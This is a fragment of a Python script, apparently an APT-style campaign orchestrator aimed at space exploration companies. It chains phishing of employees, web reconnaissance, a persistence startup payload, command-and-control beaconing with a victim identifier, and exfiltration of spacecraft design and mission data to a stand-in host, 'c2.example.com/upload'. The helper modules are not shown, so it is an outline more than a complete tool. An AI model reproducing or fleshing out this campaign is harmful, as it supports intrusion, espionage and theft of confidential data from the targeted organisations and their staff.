...
def main():
    """
    Main function to run the space_exploration_campaign campaign.
    """
    print(f"[*] Starting space_exploration_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("space_exploration_companies_employees.txt")
    run_tool("apt_web_recon.js", "--target space_exploration_companies.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/spacecraft_designs_and_mission_data_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-SPACE_EXPLORATION_COMPANIES-01")
    ...
    exfiltration.exfiltrate_data("spacecraft_designs_and_mission_data/spacecraft_designs_and_mission_data.zip", "https://c2.example.com/upload")
    run_tool("payloads/spacecraft_designs_and_mission_data_exfiltrator.py")
